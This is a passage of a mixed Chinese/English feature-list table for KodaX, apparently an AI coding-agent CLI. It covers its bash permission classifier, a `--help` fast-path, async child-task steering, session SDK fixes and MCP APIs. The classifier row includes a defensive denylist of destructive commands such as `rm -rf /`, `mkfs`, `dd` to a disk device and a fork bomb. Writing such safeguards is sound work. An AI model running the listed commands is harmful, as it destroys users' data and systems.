而不是 unhandled rejection）；(3) `BashPrefixExtractor` interface 加到 `PermissionContext`；(4) 4 个生产 call site 全部走新路径——REPL/InkREPL/ACP server/executor.ts，**无新旧并行 cutover**。**Live getter 模式**：`getProvider` + `getModel` 都是 live getter（对齐 FEATURE_092 hotfix-3），mid-session `/provider` + `/model` 切换无需重建 extractor。**与 FEATURE_154 关系**：FEATURE_154 `--help` fast-path 在 extractor 之前，绕过 LLM 调用；只有非 `--help` 命令进 LLM extractor。**与 FEATURE_152 关系**：extractor 提供 SAFE PREFIX 这一抽象用 LLM 比纯 AST 更鲁棒（处理 alias / unfamiliar tools），不是 AST 的替代方案，两者互补 |
| `154` | Universal `--help` Fast-Path — Generalise CC `isHelpCommand` Beyond 12 Language Tools | Enhancement / UX + Internal / Performance | Medium | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_154-universal---help-fast-path) | **基于 [Issue 129](KNOWN_ISSUES.md#129) 后续 KodaX vs `c:/Works/claudecode/src/` 对照立项**。CC [`commands.ts:388-436 isHelpCommand`](C:\Works\claudecode\src\utils\bash\commands.ts#L388-L436) 让任何 `cmd --help` 命令绕过 Haiku prefix extractor 和 YOLO classifier，省 LLM 调用 + 提速。KodaX 当前 [`permission.ts:68-76`](../packages/repl/src/permission/permission.ts#L68-L76) 只对 12 个 hard-coded 语言工具（`node` / `npm` / `python` / etc.）放行 `--help`；用户跑 `docker --help` / `kubectl --help` / `terraform --help` 全部走 LLM classifier，每次浪费一次 token cost + 延迟。**实现 ~50 LoC**：纯函数 `isHelpCommand(command): boolean`（trim → endsWith `--help` → 拒绝引号 → split + 校验：每个 token 要么是 `--help` 要么是简单字母数字），加在 [`isBashReadCommand`](../packages/repl/src/permission/permission.ts) 顶部 fast-path。**严格于 CC 一处**：CC `shell-quote` 把 `$VAR` 当 object token 跳过，KodaX 简单 split 把 `$VAR` 当 string 拒绝；这是有意的安全保守。**与 FEATURE_152 关系**：本 feature 不依赖 `shell-quote`（FEATURE_152 引入），用简单 string split 即可；FEATURE_152 落地后 `isHelpCommand` 内部仍然用简单 split（更直接），不切换到 AST 路径。**与 FEATURE_092 关系**：减少 auto-mode classifier 调用频次，用户体验对齐 CC auto 模式"无打断"承诺 |
| `120` | Async Child Steering — SendMessage + TaskStop + Dispatch model_hint Field | Internal / Architecture | High | `v0.7.39` | [v0.7.39](features/v0.7.39.md#feature_120-async-child-steering) | **Shipped 2026-05-12 — implementation + Phase 5b behavioral eval delivered; SHIP gate met (≥4/5 aliases ≥80% on both cases)**. Delivered in 11 phases across 18 commits (`cce78f67` → `2571e414`). **Step 0 orchestration lift to `@kodax/agent` (ADR-021)**: `ChildTaskRegistry` + `registerChildTask` helper (FEATURE_155 Bug A `.finally(delete)` chain built-in) at Phase 1a; full `idle-yield.ts` (`detectIdleYield` / `waitForWakeEvent<TChildResult>` / `composeIdleYieldUserMessage` / `IdleYieldSnapshot` with Bug E + F hotfix invariants intact) at Phase 1b; `runWithIdleYield<TRunResult, TChildResult>` API + 9 tests at Phase 1c-1; coding `runner-driven.ts` outer `while(true)` replaced with single call (Phase 1c-2, net −42 LoC); agent-only fan-out + idle-yield example at Phase 1c-3 (proves `@kodax/agent` standalone-consumable). **Option D fan-out narrow lift**: original plan called for full `child-executor` lift; capability audit found read/write split + AGENTS.md injection + worktree isolation are coding-flavor — narrowed to just `runFanOut` generic primitive (bounded concurrency + abort + progress events) at Phase 1d-1 (11 tests); `executeChildAgents` rewritten as thin wrapper at Phase 1d-2 (−27 LoC, behavior parity verified by reviewer 0 findings). **Surface**: `routeMessage` agent primitive (Phase 2a, 6 tests) + `send_message` coding tool wrapping content in `<coordinator-instruction>` tags (Phase 2b, 10 tests); `requestTaskStop` agent primitive with `unknown-target` / `already-aborted` discrimination + first-cause-preserving signal.reason (Phase 3a, 7 tests) + `task_stop` coding tool with per-child AbortController allocation chained to parent signal via one-shot listener (Phase 3b, 9 tests). **MEDIUM caught + fixed in `20c06d38`**: original task_stop ordering enqueued `<coordinator-stop-request>` before checking abort registry — orphan-message leak in inter-cleanup window between `childAbortControllers.delete` (inner IIFE `.finally`) and `childTaskRegistry.delete` (outer `registerChildTask.finally`). Swapped to abort-first then enqueue. **Schema-only `model_hint`**: Phase 4 surfaces `'fast' \| 'balanced' \| 'deep'` on dispatch with tolerant parse + no-op routing (FEATURE_102 v0.7.45 activates). **Worker prompt**: Phase 5a `ASYNC CHILD STEERING` block + 6 structural pin tests. Both `send_message` and `task_stop` added to `CHILD_EXCLUDE_TOOLS_BASE` (coordinator-only). **Phase 5b (Layer 2 behavioral eval) shipped in this release** — `tests/feature-120-child-steering.eval.ts` + `benchmark/datasets/feature-120-child-steering/cases.ts` (Layer 2 single-turn probe per `benchmark/EVAL_GUIDELINES.md`; 2 cases × 5 runs × 5 production aliases = 50 LLM calls ~$1.5). **SHIP gate cleared with margin (final rejudged numbers)**: `send_message_trigger` 4/5 aliases ≥80% (kimi/ark/v4pro 100%, mmx 80%, zhipu 20%); `task_stop_trigger` **5/5 aliases 100%**. **Initial-pass judge defect + LLM-judge audit fix**: the first regex `tool_name\s*\(` produced a 14% false-negative rate (50 raw outputs, 7 disagreements vs LLM-judge) because zhipu/glm51 emits `<task_stop>(args)` / `<task_stop>...</task_stop>` / JSON-in-XML shapes that don't pass `\s*\(`. Confirmed by a panel-internal 3-judge majority-vote audit (`tests/feature-120-child-steering-judge-audit.eval.ts`, zhipu/glm51 + ds/v4pro + kimi, 150 LLM calls). Judges rewritten as multi-syntax (`buildToolNamePatterns` covering fn-call / JSON / XML / kw); EVAL_GUIDELINES anti-pattern 7 amended with strict clause §4 (multi-syntax mandatory) + §5 (judge-model selection: panel-internal majority vote, anthropic/openai prohibited). **Case-design diagnosis (separate, earlier pass, recorded in `cases.ts`)**: first send_message_trigger user message ("also check the auth module") was ambiguous between widen-scope (`send_message`) and parallel-sibling-dispatch (`dispatch_child_task`); 3/5 aliases chose the parallel-dispatch alternative. Reshaped to within-scope constraint refinement ("skip vendored libs under packages/coding/vendor/") — no valid sibling alternative. **Updated zhipu/glm51 read**: not a steering-tool floor model — produces semantically-correct task_stop calls 100% of the time but emits non-standard syntax; provider-side parser tolerance is the production correctness gate. `model_hint` advisory case intentionally dropped (anti-pattern 7 — no positive/negative assertion; AND routing on hint is no-op in v0.7.39, FEATURE_102 v0.7.45 activates). The original "defer to post-release" decision was rescinded by the user on 2026-05-12. **Final state**: 27 agent test files / 363 tests + 230 coding test files / 2238 tests all green; `tsc -b` both packages clean. **Cross-feature impact**: FEATURE_122 PM Thinking (cancelled v0.7.41) and FEATURE_123 Peer-to-Peer SendMessage (planned v0.7.44) both noted in their entries that FEATURE_120's `routeMessage` is the substrate they build on — Step 0 lift makes peer-to-peer just a registry-type change, not new orchestration |
| `155` | Chat-While-Waiting — Remove `await_child_task`, Adopt Claude-Code Idle-Yield Pattern | Internal / Architecture + Enhancement / UX | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_155-chat-while-waiting) | **基于 2026-05-10 用户反馈 + `c:/Works/claudecode` 双向对照立项**。FEATURE_119 (v0.7.36) Pattern B 的 `dispatch_child_task` + `await_child_task` 双工具组合让 Worker 在 await 时阻塞 30+ 秒，即使 prompt 教过 anti-immediate-await（FEATURE_148）也照样滥用——5 个 alias × 5 run × 1 case eval 实测 V2 Worker 在"edit + build"任务上 immediate-await 拒绝率仅 45%。Claude Code 的"chat while waiting" UX 来自**根本不存在 await 工具**：`AgentTool.tsx:733` 用 `void` 显式丢弃 sub-agent promise，main agent turn 自然 idle，sub-agent 完成时通过 `<task_notification>` 入消息队列，user input 通过同队列 priority='user' 回灌——单一队列承载两种事件。**KodaX 改 4 phase（10 commit / ~5 天 / 单 patch release）**：Phase A idle-yield 状态机（detector + waiter pure utility, runner-driven outer loop wiring）；Phase B Worker prompt IDLE-YIELD 段 + Worker chain 摘工具（V1 链先保留）+ Layer 2 eval 验证 ≥80% alias 采用 idle-yield；Phase C V1 链 + tool 文件 + registry + CHILD_EXCLUDE_TOOLS_BASE + async-dispatch 测试 + YIELD_TOOL_NAMES + 4 个 prompt 字面量 + 4 个 benchmark dataset 全删；Phase D v0.7.39 设计稿 + Layer 2 chat-while-waiting 行为 eval（验证 user 在 idle 期间输入 ≤300ms 注入）+ 完整 3410+ 测试回归。**配套 retire**：`tests/feature-148-post-dispatch-probe.eval.ts` (anti-immediate-await 反模式 eval，删 await 后 obsolete) 移到 `tests/_archive/`。**与 FEATURE_119/148 关系**：Pattern B 的 fire-and-forget dispatch 保留；删的是配对的 await 工具——把 v0.7.36 当时按"经典异步编程"模型设计的双工具压回单一队列模型。**与 FEATURE_115 关系**：复用 MessageQueue 已有 priority='user'/'background' 双优先级——user 输入打高优、`<task-completed>` 打低优，同一 dequeue 周期 user wins。**Status (2026-05-11)**：Phase A→D 已交付并实际 ship 于 **v0.7.38**（不是原计划的 v0.7.39，因为 RC snapshot 之后做完）。Phase A→C commits `6a420504` / `1f0d1eab` / `bbf747d3` / `3828265f` / `016e3fb2` / `1a08de10` / `6a63d986` / `3830141b` / `80410e49` / `c8990094` / `35468f9f`；Slice B1 二次 eval 加 zhipu/glm51 后 SHIP gate met（3/5 alias ≥80%），default 已翻 ON；Slice C3 retire `KODAX_IDLE_YIELD` env-flag（删工具后 OFF 路径无 working semantics）。**Hotfix follow-up chain (2026-05-11)**：(Bug A→D abort listener / scout-label leak / fast-child race) commit `c1bdaf4`；(Bug E hasPendingBackgroundMessages 加入 idle-yield 联合判定) commit `3494a27`；(Bug F+G abort listener leak + scout preflight 用 managedWorkerTitle) commit `3ccf322`。Phase D 设计文档落在 [v0.7.38 features doc](features/v0.7.38.md#feature_155-chat-while-waiting) |
| `157` | Windows / macOS Case-Insensitive Workspace Match — `pathsEqual()` for `kodax -c` Session Resume | Bug Fix / Persistence | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_157-windows--macos-case-insensitive-workspace-match) | **基于 2026-05-11 用户实战反馈立项**。用户报 `kodax -c` 上次对话只剩"一次总结回答"——给出 session id `20260511_130217` 排查后发现：该 session 是新建（无 parentSessionId / 仅 2 entries），不是 compaction 产物。真因在 [`packages/repl/src/interactive/storage.ts:880`](../packages/repl/src/interactive/storage.ts#L880) `getLastNavigableEntryId` 的 `sameWorkspace` 用 `===` 严格相等比对 `workspaceRoot` / `gitRoot`，但 Windows NTFS 大小写不敏感（VS Code shell 可能给 `C:\Works\...`、cmd.exe 给 `c:\works\...`），导致同一 repo 的 session 因 drive-letter case 不同被判定为不同 workspace 而看不见。**实现 ~15 LoC + 1 test**：(1) 加 `pathsEqual(a, b)` helper——win32 + darwin 走 lowercase 对比（HFS+ / APFS 默认大小写不敏感），其他平台保留严格相等（Linux ext4 etc. 区分大小写）；(2) `sameWorkspace` 两处比对都换用 `pathsEqual`；(3) test mock workspace-runtime 返回 lowercase 变体 + uppercase 保存 session + 断言 list 能找到，非 win32/darwin 平台 skip。**与 storage 其他 case-sensitive site 关系**：session 文件名本身已 normalize（lowercase timestamp），不受影响；只有 workspace path 比对受 OS filesystem semantics 影响。**风险极低**：纯加强一处比对，POSIX 平台行为不变 |
| `156` | Idle-Wait Visual Continuity — Status-Bar "Waiting for N Children" Indicator | Enhancement / UX | Low | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_156-idle-wait-visual-continuity--waiting-for-n-children-status-bar-indicator) | **基于 2026-05-11 用户体感反馈立项**。FEATURE_155 + hotfix follow-up `3ccf322` 修好 fast-child race 之后，Worker idle-yield 期间 spinner 还在转、`isLoading=true`、能 chat-while-waiting——三件事都到位。**唯一差距**：状态栏只显示 `H0 - Worker`，看不出"在等什么、几个、还要多久"，用户体感像"卡住"。对照 Claude Code 的"spinner + 输入框可用 + 明确告知在等 sub-agent" 三件套，KodaX 缺最后那句文案。**实现 ~80 行 + 10 tests，单 commit**：(1) `KodaXManagedTaskStatusEvent` 加两个可选字段 `idleWaiting?: boolean` + `idleWaitingPendingCount?: number`；(2) `ObserverBridge` 加 `idleWaiting(role, count)` 方法，runner-driven 外层循环在 `detectIdleYield` 返回 true 后、`waitForWakeEvent` 前调用一次——**agent-agnostic**：从 `currentAgent.name` 映射到 5 个 `*_AGENT_NAME` 常量，今天只 Worker 能到，但字段不锁 V2-only 不变量；(3) REPL `status-bar.ts` 加 idle-wait 分支，count>1 渲染 `"waiting for N children"`、count=1 单数 `"waiting for 1 child"`、count=0 transitional `"idle - resuming"`（fast-child race 恢复瞬态）。**Tool/thinking 正在跑时不渲染** idle-wait——stale event 不会盖住已 resumed 的真实状态。Consumer 严格判 `=== true`，下一个 role-emit 自然 clear。**不动**：不新增 phase（复用 `worker` 子状态）、不动 transcript（只 spinner 行）、不动 isLoading / MessageQueue。**风险极低**：纯 additive 可选字段，老 consumer 行为完全不变。**与 FEATURE_155 关系**：fast-child race 修复（`3ccf322`）让 idle-wait 真正能保持 run alive，本 feature 加视觉指示让用户能看出在等什么——两者一起完成 chat-while-waiting 体验闭环 |
| `158` | auto[llm] Signal-Based Classifier — 决策层级倒置 + Windows-flag 误判结构性修复 (subsumes Issue 131) | Core / Security + Internal / Architecture | High | `v0.7.39` | [v0.7.39](features/v0.7.39.md#feature_158-autollm-信号化分类器--决策层级倒置--windows-flag-误判结构性修复) | **基于 2026-05-12 用户实战反馈 + KodaX vs `c:/Works/claudecode/src/` 双向对照立项**。[FEATURE_092 (v0.7.33)](features/v0.7.33.md#feature_092-auto-mode-classifier--llm-reviewed-permission-tier-for-high-risk-tool-calls) 引入的 auto-mode LLM 分类器在实际运行中 **~70% 时间被 REPL 同步硬规则 short-circuit**（[`InkREPL.tsx`](../packages/repl/src/ui/InkREPL.tsx) Step 2.5 dangerous-bash + Step 3 protected-path veto），承诺的"LLM 综合判断"形同虚设；同时 [`looksLikePath` (permission.ts:608)](../packages/repl/src/permission/permission.ts#L608) 启发式把 Windows cmd flag `/R` / `/B` / `/Y` 当作 POSIX 绝对路径 → `path.resolve('/R')` 解析为 `C:\R` 项目外路径 → 触发"Protected path"假阳性，影响 `findstr /R` / `dir /B` / `where /R` / `xcopy /Y` / `robocopy /MIR` / `fc /B` 等所有 Windows 内置工具调用。**对照 CC [`useCanUseTool.tsx`](C:\Works\claudecode\src\hooks\useCanUseTool.tsx) + [`SAFE_YOLO_ALLOWLISTED_TOOLS`](C:\Works\claudecode\src\utils\permissions\classifierDecision.ts) + [`yoloClassifier.ts`](C:\Works\claudecode\src\utils\permissions\yoloClassifier.ts)**：CC 在 auto 模式下**只有一个决策点**，`dangerousPatterns.ts` / `pathValidation.ts` 是分类器 prompt 的**输入信号**，不是分类器之前的硬否决。**KodaX 三层金字塔架构**：Tier 1 (REPL bash-read + `--help` + `SAFE_YOLO_ALLOWLISTED_TOOLS`，zero LLM cost) → Tier 0 (Guardrail 层 5 条 catastrophic 绝对禁令：`rm -rf /\|~` / `mkfs.*` / `dd of=/dev/sd*` / fork bomb / `~/.kodax/` 写，**LLM 不能 override**) → Tier 2 (Guardrail LLM 综合裁决，原所有规则转 signals[] 喂给 classifier prompt + speculative classify 500ms 窗口抹平延迟) → Engine 降级 fallback (denial 3/20 或 breaker 5/10m 后**重新激活 REPL Step 2.5/3 全规则路径**做 defense-in-depth，等价今天 auto-in-project 行为)。**10 commit 拆分**：(1) ADR-025 Accepted + 设计稿 → (2) `signals.ts` 类型 + `SignalCollector` 接口 → (3) `bash-signals.ts` + `file-signals.ts` 收集器封装现有 [`classifyBashCommand`](../packages/coding/src/permissions/bash-classifier.ts) / [`isCommandOnProtectedPath`](../packages/repl/src/permission/permission.ts) / [`getBashOutsideProjectWriteRisk`](../packages/repl/src/permission/permission.ts) 为信号 → (4) `absolute-denylist.ts` Tier 0 + `speculative.ts` 基建 + Anthropic/DeepSeek/Zhipu micro-bench → (5) `classify.ts` 接 `signals[]` + classifier-prompt.ts 更新 + auto-mode-classifier.eval.ts 复跑 + ≥5 信号场景用例 → (6) **`looksLikePath` Windows-flag 修复 + `BASH_SAFE_READ_COMMANDS` 扩 `git tag`/`git stash list`/`git describe`/`git config --get` + 7+ Windows flag 回归用例**（结构性修复 [Issue 131](KNOWN_ISSUES.md#131)，独立可 ship） → (7) `guardrail.ts` 接 Tier 0 + signals + speculative + `onEngineChange` 接 REPL → (8) **CUTOVER**：`InkREPL.tsx:beforeToolExecute` 在 `mode==='auto' && engine==='llm'` 时仅保留 Tier 1，其余下交 guardrail；`tool-confirmation.ts` 从 `_classifierSignals` 渲染 Scope/Risk 替代旧 input marker；plan/accept-edits 路径完全不动 → (9) **Release gate eval**：FEATURE_092 dataset 全量复跑 + 子代理 Tier 0 兜底 + engine 降级 fallback + Windows flag 回归 → (10) KNOWN_ISSUES Issue 131 (Windows-flag false-positive) Resolved + CHANGELOG + test guide。**平价审计 13 项**（防退化清单见 design doc）：plan 模式完全不动 / accept-edits alwaysAllowTools 不动 / FEATURE_066 dangerous 9 类规则转 signal + Tier 0 子集升 hard / `~/.kodax/` 写**加强**为 Tier 0 / 子代理 SharedState 不动 / SDK consumer (executor.ts) 无 guardrail 时 Step 2.5/3 仍执行 / FEATURE_153 prefix extractor 不动 / FEATURE_154 `--help` fast-path 保留 Tier 1 / denial-tracker + circuit-breaker 不动 / engine 降级时重新激活原规则。**不引入新旧并行路径**（user feedback memory 强约束）——REPL Step 2.5/3 在 auto 路径直接删除，不留 feature flag；engine 降级通过 `autoModeEngineRef` 切换语义。**Release gate**：commit 8 cutover 必须配 commit 9/10 同 release；eval 不通过即 hold cutover。**Open Questions self-resolved**：(1) `~/.kodax/` IPC 例外**不需要**——内部配置写不走 bash tool；(2) speculative 窗口初始 500ms，`KODAX_AUTO_SPECULATIVE_WINDOW_MS` env 可调，micro-bench 后固化；(3) `/auto-signals` debug 命令推 v0.7.40 follow-up |
| `122` | ~~PM Thinking Framework Prompt — 4-Stage Workflow + Continue-vs-Spawn + Synthesis Discipline~~ | ~~Enhancement / Quality~~ | ~~Medium~~ | ~~`v0.7.41`~~ | [v0.7.41](features/v0.7.41.md#feature_122-pm-thinking-framework-prompt) | **Cancelled**: claudecode 4-stage workflow 是 Coordinator mode 双角色身份切换的配套 prompt（PM 身份 → PM 工作方式）；KodaX 单 Worker 模式无身份切换需求。LLM 在 fan-out 后默认会做 Synthesis，122 仅为 ~8.4% 任务（fan-out 28% × 多 child 并行 30%）的边际优化加完整 feature，违反 KodaX `NEVER add abstractions until 3+ concrete use cases`。剩余真实价值（fan-out 时显式 Synthesis）通过 v0.7.36 FEATURE_114 worker-role-prompt 加 1-2 行 hint 覆盖。Continue-vs-Spawn 决策由 FEATURE_120 send_message 工具描述自然引导 |
| `094` | ~~Deep Anti-Escape Hardening — Runtime Detection and Retry Contract for Generative Large-File Writes~~ | ~~Core~~ | ~~Medium~~ | ~~`v0.7.42`~~ | [v0.7.42](features/v0.7.42.md#feature_094-deep-anti-escape-hardening--runtime-detection-and-retry-contract-for-generative-large-file-writes) | **Cancelled 2026-05-19**: necessity probe（5 alias × 3 case × 3 run = 43 probes，pre-registered decision matrix）实测 escape rate **0.0%** panel mean / **0.0%** max alias，远低于 cancel threshold（<5% AND <15%）。原 2026-04 设计基于当时观察的 ~15% bypass 数据；2026-04 至 2026-05 期间 FEATURE_152 (bash AST) + FEATURE_158 (signal-based classifier) + FEATURE_169 (pull-tool prompt hardening) 三者叠加把 path-policy 风险吸进通用 bash 安全网，加上 v0.7.26 write/bash 工具描述里的 anti-bash-generation 段已经被模型 100% 听从。Probe 保留为永久回归探针 ([cases.ts](../benchmark/datasets/feature-094-necessity-probe/cases.ts) + [eval driver](../tests/feature-094-necessity-probe.eval.ts))，escape rate 必须保持 0%，>5% 触发 F094 重新立项 |
| `175` | Plan-List Resilience — `op:'init'` Mid-Task Status Preservation + B2 Synth Auto-Completion (dirty-reject prototyped + REVERTED post-eval) | Core / UX + Bug Fix | High | `v0.7.42` | [v0.7.42](features/v0.7.42.md#feature_175-plan-list-resilience--opinit-mid-task-status-preservation--b2-synth-auto-completion) | **基于 2026-05-19 用户实战 session 立项**（V2 PLANNED 跑 12m54s 后 plan 列表停在 `0/4 completed`、用户描述"列表失效"）。**三个独立缺陷叠加**：(1) [`todo-store.ts:218-237`](../packages/coding/src/task-engine/todo-store.ts#L218-L237) `init()` 无条件 reset status to pending，Worker mid-task 调 `op:'init'` refine scope 时把之前 completed/skipped/cancelled 全推回 pending；(2) FEATURE_167 (v0.7.41) B2 synth fallback 直接对 `recorder.verdict` 属性赋值绕开 `wrapEmitterWithRecorder` slot setter，`autoCompleteOnAccept` 永不触发，run 终态是 accept 但 UI 永远定格在 `0/N completed`；(3) tool 层对 dirty store 的 op:'init' 无拦截，加重 (1) 的发生率。**Slice 1 三个 fix 同版本 prototype**：(a) `init()` id-match terminal-success preserve（保留 completed/skipped/cancelled + note，新 id pending，pending/in_progress/failed 重置）SHIPPED；(b) B2 synth path 补 `todoStore.autoCompleteOnAccept()` 镜像 wrapper side-effect SHIPPED；(c) `executeInitOp` 在 store 含非 pending item 时返回 `{ok:false, reason:"... use surgical APIs ..."}` PROTOTYPED → eval-driven REVERTED。**Slice 3 Layer 2 panel**（51 calls = 1 pilot + 50 phase1，~$3）：zhipu/glm51 在 C1+C2 共 10/10 失败、self-judge audit disagreement 0% 确认是真实 [[project_zhipu_send_message_floor]] structural intent-vs-action floor（典型样本"明白，用 todo_create 插入新步骤："后接 prose 但无实际 tool 调用）；其他 4 alias C1 全 100% / C2 均 ≥80%。pre-registered SHIP gate (b) hard-fail → REVERT fix (c)。**Slice 2 测试净增 6 个（4 todo-store + 1 todo-update revert-marker + 1 runner-driven integration）+ 1 既有测试更新**：monorepo coding 2704/2704 + repl 1431/1432 全绿。Eval dumps 留 `%LOCALAPPDATA%/Temp/kodax-eval-dumps/feature-175-init-reject-recovery/`（[feedback_eval_dumps_stay_in_temp](../../../memory/feedback_eval_dumps_stay_in_temp.md)）。Reverted code 留 marker 注释 + revert-pin 测试防未来 silent 复活 |
| `174` | `kodax sessions dedupe` — Cleanup of orphaned `runner-*.jsonl` double-write ghost files | Internal / Maintenance + CLI | Low | TBD | _design pending_ | **基于 FEATURE_173 Part A 修复后立项**：runner-id 双写问题在 v0.7.42 后新会话不再产生，但用户 `~/.kodax/sessions/` 历史目录里仍残留 v0.7.42 之前生成的 `runner-{epoch}.jsonl` 文件。新增一个 CLI 子命令 `kodax sessions dedupe`：扫描 sessions 目录，识别"REPL session (`YYYYMMDD_HHMMSS.jsonl`) + 时间戳相近的 `runner-*.jsonl` 对"，将 runner 半边移到 `~/.kodax/archive/dedupe-{date}/` 留 30 天后由 GC 清掉。**显式 dry-run 默认**：未带 `--apply` 时仅打印待清理列表，不动文件。**Scope 不包含**：自动后台清理 / startup hook 自动跑 / 全量 GC（KodaX 不主动删除用户 session 数据）。预计 ~150 LoC + 一组 dry-run/apply contract test。本 v0.7.43 不做实现,只是 FEATURE_LIST 占位防漂。|
| `173` | Session Management Public SDK + `session.id` Propagation Bug Fix — `@kodax-ai/kodax/session` subpath surface (listSessions / loadSession / forkSession / rewindSession / watchSessions + running-session lock via FEATURE_125 heartbeat) + eliminate `runner-${epoch}` double-write ghost files | Internal / Architecture + SDK Surface + Bug Fix | Medium | `v0.7.42` | [v0.7.42](features/v0.7.42.md#feature_173-session-management-public-sdk--sessionid-propagation-bug-fix) | **Shipped 2026-05-22** (Part A bug fix + Part B 9-API SDK + 13 contract tests — 12 Part B + 1 Part A). 基于 KodaX Space 桌面端 sessions 树视图需求 + 实战 `~/.kodax/sessions/` 双写现象立项。**Part A bug fix**：runManagedTask 调用链上 `opts.session.id` 在 `runWithIdleYield` → `primitives/runner.ts:614` 之间被剥掉，导致 [`runner-driven.ts:1872`](../packages/coding/src/task-engine/runner-driven.ts#L1872) `effectiveRunResult.sessionId ?? \`runner-${Date.now()}\`` 永远落到右侧 fallback，[`runner-driven.ts:1948`](../packages/coding/src/task-engine/runner-driven.ts#L1948) `saveSessionSnapshot` 用合成 id 写出 `runner-*.jsonl`；REPL 几百毫秒后再用 `context.sessionId` (`YYYYMMDD_HHMMSS`) 写一份，每段对话留两个 `.jsonl`。修复点 ~5-15 LoC + 2 个 contract test 永久锁住"一次 save"。**Part B SDK surface**：新增 `packages/repl/src/session/public-api.ts` thin facade 包 `FileSessionStorage`，通过 `@kodax-ai/kodax/session` subpath 暴露 `listSessions({ projectRoot, scope, includeArchived, limit, before })` / `loadSession(id)` / `forkSession(id, opts)` / `rewindSession(id, opts)` / `setActiveEntry(id, selector)` / `deleteSession(id)` / `listRunningSessions()` / `watchSessions(cb)` + `createSessionManager({ sessionsDir })` factory。**Running-session lock 复用 FEATURE_125 team-mode** `<configHome>/instances/<pid>/` heartbeat（加 sessionId 字段一行改动 + 30s staleness 同 reap threshold），mutation 撞 running session 返回 `{ error: { code: 'session_running', runningProcess: { pid, startedAt } } }` 不抛。**`watchSessions` 平台分支**：POSIX `fs.watch` + 100ms debounce coalesce / Windows 1000ms polling（cross-process file creation 在 Windows fs.watch 不可靠）。**Stable contract 测试 12 项**显式锁 `SessionSummary` 字段名 + `forkSession` never-throws 语义 + running gate + watch coalesce，未来重构静默 break 触发 hard fail。**不在 scope**：老 `runner-*.jsonl` 清理（→ FEATURE_174 `kodax sessions dedupe` 独立 ship）/ rewind 跨 dispatch_child_task / compaction boundary 语义（→ ADR-029 独立 RFC，当前 fail-closed）/ `FileSessionStorage` 上提到 `@kodax-ai/session-lineage`（v0.8.0+，要先抽 workspace-runtime / json-guards helper）|
| `186` | SDK Embedder Surface Closure — KodaX Space Gap List + MCP Popout | SDK Surface / Embedder Integration | High | `v0.7.42` | [v0.7.42](features/v0.7.42.md#feature_186-sdk-embedder-surface-closure--kodax-space-gap-list--mcp-popout) | **基于 KodaX Space (downstream consumer of `@kodax-ai/kodax@0.7.40`) 提交的 10-gap 清单 + MCP popout 设计需求立项**。Space 在桌面端封装时报回的三类问题：(1) SDK 发布物缺陷 — `.d.ts` bundle 含 `@kodax-ai/*` 内部 import；(2) 能力存在但 SDK barrel 没 re-export — `bootstrapAutoMode` / `loadCommands` / `getAgentConfigHome` / 工具 side-effect 分类等；(3) 运行时 hook 缺失 — Skill `!cmd` 出走宿主 shell / `runKodaX` 是 blocking Promise / MCP 服务器只能 hand-edit config.json。**8 个 atomic phase**：Phase 1 `2e33b681` build-dts CI guard / Phase 2 `d3ab38b0` 一行 export 集 / Phase 3 `9b1e440f` skill `!cmd` 注入钩子 + `disableDynamicContext` / Phase 4 `7defd65f` `ToolSideEffect` 元数据 + 元数据驱动 plan-mode gate（51 工具全打标，`acp_server.ts` 硬编码 set 移除）/ Phase 5 `ee549d6f` 自定义 provider CRUD + 动态 config-path 解析 / Phase 6 `9ba68f25` `RunningSession` + sessionControl mid-run mutators + abort + result Promise / Phase 7 `523e9a28` MCP server CRUD + `@kodax-ai/kodax/mcp` 子路径 / **Phase 8 `McpManager` popout-shape API**（KodaX Space 反馈 Phase 7 子路径只有 types + helpers 缺 manager-shape；新加 `listServers/startServer/stopServer/getServerLogs/listTools` 5 大操作 + `provider()/execute/describe/search/read/dispose` escape hatch；20 单测 stdio JSON-RPC 全程）。**No dual route**（per [feedback_no_parallel_refactor_paths](../../../memory/feedback_no_parallel_refactor_paths.md)）：`startKodaX` 是 `runKodaX` 的 thin decorator，plan-mode gate 元数据驱动单实现，`McpManager` 是 `McpCapabilityProvider` 的 thin wrapper（capability-provider API 完全 backward-compat）。**158 个新单测**（不含既有不退化测试）。详见 [ADR-032](#adr-032-sdk-embedder-surface-closure-feature_186-v0742)。|
| `188` | dispatch_child Worktree Drop + Conflict-Awareness Prompt Hardening | Internal / Architecture + Prompt Refactor | High | `v0.7.42` | [v0.7.42](features/v0.7.42.md#feature_188-dispatch_child-worktree-drop--conflict-awareness-prompt-hardening) | **基于 FEATURE_177 panel #2 数据揭穿（0/250 real binding dispatch on C4+C5 cells，全部"PASS"是 narrative-tool-call FP）+ pilot v3 量化阈值非 load-bearing 验证（kimi +1, ark 持平, 两 alias 均未触发 ≥2 cell regression 阈值）+ 用户决定 prompt-level conflict awareness 取代 file-system worktree isolation 立项**。三个改动 cohesive：(1) **架构层** —— `child-executor.ts` 删 `executeWriteChild` 强制 `toolWorktreeCreate` + `worktreePaths` 跟踪 + `collectWorktreeDiff` + `artifactPaths`；read/write 分支收敛到只差 `excludeTools` + `systemPromptOverride`；(2) **子 agent prompt 层** —— `buildChildBriefing` 加 "Coordination with peers" 段：教 child 检测 peer agent / 外部线程冲突 + halt-on-conflict-possible + report-back-to-coordinator；(3) **coordinator prompt 层** —— `worker-role-prompt.ts dispatchRules` 删量化阈值（`≥3 independent investigations` → `multiple` / `≥45 seconds` → `a while` / `≥3 modules` → `multiple modules`）+ 删 RULE C 里 "Worktrees are isolated; merge happens at Evaluator review time" 一句（worktree drop + FEATURE_184 Evaluator role 删 都让这句变 false statement）。**保留**：RULE A/B/C labels + Generator-equivalent gate + single-file ✗ 守卫（带 WHY 满足 ADR-033 §3）+ IDLE-YIELD 段 + FEATURE_155 v0.7.39 注解（整体 claudecode-style restyle 是 v0.7.43 独立 FEATURE，本 FEATURE 严格限定 scope）。**`readOnly` 参数保留**（gates write tools 可用性 + Scout safety check），prompt 不教（schema description 是唯一源）。**测试改动**：CAP-097 child-worktree contract test 整文件删；CAP-095/096 + child-executor.test.ts mocks 更新；新单测覆盖 conflict-awareness 段存在。**Re-eval**：worktree-dropped + qualitative prompt 在 C4 + C5 + 5 alias × 5 runs 上 intent rate ≥ baseline（pre-registered ship gate）。详见 [ADR-034](#adr-034-claudecode-parity-dispatch_child-architecture--drop-forced-worktree--prompt-level-conflict-awareness-feature_188-v0742)。|
